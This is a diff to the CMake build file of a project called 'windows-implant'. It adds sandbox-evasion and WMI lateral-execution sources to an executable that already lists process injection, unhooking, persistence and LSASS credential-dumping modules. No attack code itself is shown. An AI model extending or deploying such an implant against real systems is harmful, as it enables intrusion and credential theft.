@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.20)
-project(windows-implant LANGUAGES CXX)
+project(windows-implant LANGUAGES C CXX)
 
 if(POLICY CMP0135)
   cmake_policy(SET CMP0135 NEW)
@@ -62,11 +62,13 @@ add_executable(main WIN32
     src/evasion/SyscallStub.asm
     src/evasion/Unhooker.cpp
     src/evasion/Injector.cpp
+    src/evasion/AntiSandbox.cpp
     src/execution/DotNetExecutor.cpp
     src/network/SocksProxy.cpp
     src/persistence/WmiPersistence.cpp
     src/persistence/ComHijacker.cpp
     src/credential/LsassDumper.cpp
+    src/lateral/WmiExec.cpp
     external/sqlite3/sqlite3.c
 )
 
